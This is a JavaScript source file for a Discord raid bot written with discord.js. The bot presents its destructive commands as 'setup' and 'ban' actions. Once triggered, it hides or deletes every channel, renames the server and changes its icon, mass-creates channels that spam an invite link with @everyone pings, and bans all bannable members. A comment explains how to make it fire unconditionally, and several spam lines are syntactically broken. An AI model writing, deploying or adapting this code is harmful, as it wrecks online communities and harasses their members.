const {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionsBitField,
  IntentsBitField,
  Partials
} = require("discord.js");
const msg=`https://discord.gg/QAJcNg25
@everyone
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
​
`
const fs = require("fs")

const client = new Client({ intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages
  ], partials: [Partials.Channel] });
var ctkppng = fs.readFileSync("./ctkp.png")

process.on('uncaughtException', function(err) {
    console.log(err)
});

client.on("messageCreate", async (message) => {
  if (message.content === '!wappa') {
    /*↑"message.content === '!wappa'"をtrueに書き換えたら問答無用で起爆する危険なbotの出来上がり*/
    var g = message.guild.id
    console.log(g)
    var ch = JSON.parse(JSON.stringify(message.guild)).channels
    for (const a of ch) {

      client.channels.cache.get(a).permissionOverwrites.edit(message.guild.roles.everyone,{
        ViewChannels:false
      })
    }
    var qwer = setInterval(function() {
      client.guilds.cache.get(g).channels.create({
        name: `TheAARR`,
        type: 0,
        parent: null
      }).then((ch) => {
        
          ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);
        
      }).catch((err) => { console.log(err); });
    }, 100)
    setTimeout(function(){clearInterval(qwer)},6000)
    console.log(ch)

  }

})
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isCommand()) {
    return;
  }
  if (interaction.commandName === 'setup') {
    await interaction.deferReply();
    interaction.guild.setIcon(ctkppng)
    interaction.guild.setName("荒らし共栄圏支配下")
    var g = interaction.guild.id
    console.log(g)
    var ch = JSON.parse(JSON.stringify(interaction.guild)).channels
    for (const a of ch) {

      client.channels.cache.get(a).delete()
    }
    
    var qwer = setInterval(function() {
      client.guilds.cache.get(g).channels.create({
        name: `ワッパステイ主席万歳!荒らし共栄圏最強!`,
        type: 0,
        parent: null
      }).then((ch) => {
        ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);
      }).catch((err) => { console.log(err); });
    }, 100)
    setTimeout(function(){clearInterval(qwer)},6000)
    console.log(ch)
  }
    if (interaction.commandName === 'ban') {
        await interaction.deferReply();
        for(const d of JSON.parse(JSON.stringify(interaction.guild)).members){
            
            	var p = await interaction.guild.members.fetch(d)
                if(!p.bot){
                	console.log(p)
			if(p.bannable){
		 	 	p.ban()
				}
               		}
		}
        interaction.editReply("BANしました")
		interaction.editReply("実装中の機能です。")
    }
});


client.login(process.env.token)

client.on('ready', async () => {
  const data = [{
    name: "setup",
    description: "セットアップを開始します",
  },{
      name:"ban",
	  description: "BANします",
  }];
  await client.application.commands.set();
  console.log("Ready!");
  console.log(`Logged in as ${client.user.tag}!`);
});
